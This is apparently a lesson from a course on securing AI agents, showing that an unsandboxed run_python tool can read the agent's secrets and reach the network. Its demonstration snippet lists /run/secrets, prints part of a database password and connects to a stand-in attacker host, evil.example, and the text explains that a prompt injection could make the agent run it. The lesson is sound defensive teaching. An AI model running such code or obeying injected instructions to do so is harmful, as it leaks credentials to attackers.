# Lesson 3: The Most Dangerous Tool

HelpBot has a new tool, `run_python`. It runs a short Python snippet and returns what the snippet printed. Agents use tools like this constantly, for math, dates, parsing, quick data work.

```bash
bin/ask.sh alice "Use python to compute the number of days between 2026-01-01 and 2026-12-25."
```

```
  tool run_python({"code": "from datetime import datetime; ..."})  [ok]
Answer: 182 days.
```

Useful. Now look at what it really is.

## "Run code" means "do anything this process can do"

By default (`SANDBOX_CODE` off) the snippet runs **inside the agent's own container**. That container has the agent's network, the mounted workspace, and the agent's database secrets. A snippet can touch all of it. See for yourself:

```bash
docker exec agent-api python -c "
import asyncio
from app import code_tool
code = '''
import glob
print('secrets I can see:', glob.glob('/run/secrets/*'))
print('database password:', open('/run/secrets/agent_app_password').read()[:12])
import socket; socket.setdefaulttimeout(3)
try:
    socket.create_connection(('evil.example', 80)); print('network: reached evil.example')
except Exception as e: print('network:', type(e).__name__)
'''
print(asyncio.run(code_tool._run_in_process(code)))
"
```

```
secrets I can see: ['/run/secrets/kb_ingest_password', '/run/secrets/agent_app_password', '/run/secrets/internal_api_key']
database password: SrgLVt3OJM32
network: reached evil.example
```

A single snippet read every secret the agent holds and opened a connection to the attacker's server. Now remember Part 2: an attacker does not need `docker exec`. A prompt injection that reaches `run_python` can make the agent run exactly this. Every app-level guard from Part 3 is irrelevant here, because the guards are Python running in the same place the attacker's code now runs.

This is why "let the agent run code" is the capability to think hardest about. The next lesson puts it in a box.

Next: [The Sandbox](04-sandbox.md)
